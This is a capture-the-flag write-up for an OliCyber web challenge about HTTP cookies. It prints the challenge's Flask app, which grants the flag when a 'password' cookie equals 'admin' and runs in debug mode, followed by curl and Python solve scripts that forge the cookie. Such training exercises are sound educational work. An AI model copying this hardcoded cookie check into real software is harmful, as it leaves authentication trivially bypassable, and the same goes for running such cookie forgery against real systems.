# URL
https://training.olicyber.it/challenges#challenge-344
# Concept
* HTTP cookies
# Method of solve
* the code that is used to deploy the app is as follows:
```
import json
from os import environ
from textwrap import dedent
from http import HTTPStatus
from flask import Flask, request, Response


app = Flask(__name__)


@app.route("/flag")
def flag():
    if request.cookies.get("password") == "admin":
        return Response(environ["FLAG"], mimetype="text/plain", status=HTTPStatus.OK)
    else:
        return Response("Bad password cookie. Unauthorized", mimetype="text/plain", status=HTTPStatus.UNAUTHORIZED)


if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True)
```
* according to the code, if there is a `password` cookie in the GET request with the value `admin`, then the flag is returned in the response
## Curl
* this curl command will complete the challenge:
```
curl -b "password=admin" -v http://web-05.challs.olicyber.it/flag
```
## Python
```
import requests

URL = 'http://web-05.challs.olicyber.it/flag'

my_cookies = {'password': 'admin'}

get_req = requests.get(URL, cookies=my_cookies)
req_text = get_req.text
print(req_text)
```
